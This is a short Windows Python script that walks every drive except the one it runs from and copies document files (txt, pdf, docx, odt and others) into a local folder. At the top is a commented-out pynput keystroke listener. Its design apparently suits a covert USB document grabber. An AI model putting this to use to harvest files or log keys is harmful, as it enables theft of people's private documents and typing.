# from pynput import keyboard
#
# def on_press(key):
#     print(key)
#
# with keyboard.Listener(on_press = on_press) as listener:
#     listener.join()

from threading import Thread
from win32api import GetLogicalDriveStrings
from os import getcwd, walk
import time
from shutil import copyfile


def find_files(disk):
    ext = ['txt', 'pdf', 'docx', 'dot', 'dotx', 'odt', 'ods']
    dst = getcwd()+"\\all_files"
    for root, dir, files in walk(disk):
        for i in files:
            for j in ext:
                if j in i:
                    try:
                        copyfile(f'{root}\\{i}', dst+f'\\{i}')
                    except PermissionError:
                        continue
                    # with open("log.txt", '+a', encoding='utf-8') as f:
                    #     f.write(f'{root}\\{i}\n')


def main():
    # init
    drives = GetLogicalDriveStrings()
    drives = drives.split('\\\000')[:-1]
    drives.remove(__file__[:2])
    start = time.time()
    ############################################################
    threads = [Thread(target=find_files, args=(i,)) for i in drives]
    for i in threads:
        i.start()
    threads[0].join()
    print(f'{time.time() - start}')

main()

print("End")